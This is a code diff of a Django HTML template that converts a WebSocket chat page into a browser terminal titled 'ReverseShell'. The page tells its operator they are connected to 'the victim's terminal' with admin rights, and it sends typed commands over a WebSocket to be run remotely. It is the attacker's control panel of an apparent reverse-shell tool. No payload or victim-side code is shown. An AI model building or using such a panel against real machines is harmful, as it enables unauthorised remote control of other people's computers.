@@ -1,14 +1,15 @@
 <!DOCTYPE html>
 <html>
 <head>
+    {% load static %}
     <meta charset="utf-8"/>
-    <title>Chat Room</title>
+    <title>ReverseShell</title>
+    <link rel="stylesheet" href="{% static 'node_modules/xterm/css/xterm.css' %}" />
+    <script src="{% static 'node_modules/xterm/lib/xterm.js' %}"></script>
 </head>
 <body>
-    <textarea id="chat-log" cols="100" rows="20"></textarea><br>
-    <input id="chat-message-input" type="text" size="100"><br>
-    <input id="chat-message-submit" type="button" value="Send">
-    <script>
+    <div id="terminal"></div>
+      <script>
         var ws_scheme = window.location.protocol == "https:" ? "wss" : "ws";
         const chatSocket = new WebSocket(
             ws_scheme
@@ -17,30 +18,62 @@
             + '/ws/reverse_shell/attack/'
         );
 
+        var term = new Terminal();
+        term.open(document.getElementById('terminal'));
+        var command = '';
+        runFakeTerminal();
+
         chatSocket.onmessage = function(e) {
             const data = JSON.parse(e.data);
-            document.querySelector('#chat-log').value += (data.message + '\n');
+            term.writeln(data.message);
         };
 
         chatSocket.onclose = function(e) {
             console.error('Chat socket closed unexpectedly');
         };
 
-        document.querySelector('#chat-message-input').focus();
-        document.querySelector('#chat-message-input').onkeyup = function(e) {
-            if (e.keyCode === 13) {  // enter, return
-                document.querySelector('#chat-message-submit').click();
+        function runFakeTerminal() {
+            if (term._initialized) {
+                return;
             }
-        };
 
-        document.querySelector('#chat-message-submit').onclick = function(e) {
-            const messageInputDom = document.querySelector('#chat-message-input');
-            const message = messageInputDom.value;
-            chatSocket.send(JSON.stringify({
-                'message': message
+            term._initialized = true;
+
+            term.prompt = () => {
+                term.write('\r\n$ ');
+            };
+
+            term.writeln('Welcome to ReverseShell');
+            term.writeln("You are now connected to the victim's terminal.");
+            term.writeln('You have admin permissions so feel free to play around 😉');
+            term.writeln('');
+            prompt(term);
+
+            term.onKey(e => {
+                const printable = !e.domEvent.altKey && !e.domEvent.altGraphKey && !e.domEvent.ctrlKey && !e.domEvent.metaKey;
+
+                if (e.domEvent.keyCode === 13) {
+                    prompt(term);
+                } else if (e.domEvent.keyCode === 8) {
+                    // Do not delete the prompt
+                    if (term._core.buffer.x > 2) {
+                        term.write('\b \b');
+                    }
+                } else if (printable) {
+                    term.write(e.key);
+                    command += e.key;
+                }
+            });
+        }
+
+        function prompt(term) {
+          term.write('\r\n$ ');
+          // Send command to victim's terminal via websocket.
+          chatSocket.send(JSON.stringify({
+                'message': command
             }));
-            messageInputDom.value = '';
-        };
+          command = '';
+        }
     </script>
 </body>
 </html>
